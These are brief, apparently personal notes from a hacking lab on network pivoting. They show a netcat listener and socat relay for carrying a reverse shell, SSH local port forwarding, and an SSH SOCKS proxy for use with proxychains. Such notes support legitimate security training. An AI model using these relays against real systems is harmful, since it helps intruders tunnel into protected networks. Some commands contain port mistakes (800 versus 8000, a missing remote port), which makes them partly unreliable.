### Socat
- Reverse Shell Relay
  - localhost
    - `nc -lvnp 443` this needs started first
  - target
    - `./socat tcp-l:8000 tcp:localip:443 &`
  - 8000 is the port we want the traffic to relay to and 443 is the port were connecting to
 
### SSH
  -  Port Forwarding
    -  If want to connect to a webpage that dont have access to but have access to another comp on its network
      - `ssh -L 800:10.10.10.10:80 user@10.10.10.5 -fN`
    - navigate to `localhost:8000`
      - Example assumes SSH access to 10.10.10.5 and webserver on 10.10.10.10
    - `ssh -L 8000:10.10.10.10 user@10.0.0.12 -fN`
      - above example assumes we have access 10.0.0.12 and there is a webserver running on 10.10.10.10
      - fN backgrounds the shell and indicates just set up connection and not exectute a command
  - Proxy
    - `ssh -D 8000 user@target.thm -fN`
    - Can also use 1337 as a port. It will open up a port 1337 on localhost to act as a proxy and send data through into the protected network. This is used with proxychains.
      - Make sure proxychains config file set up correctly
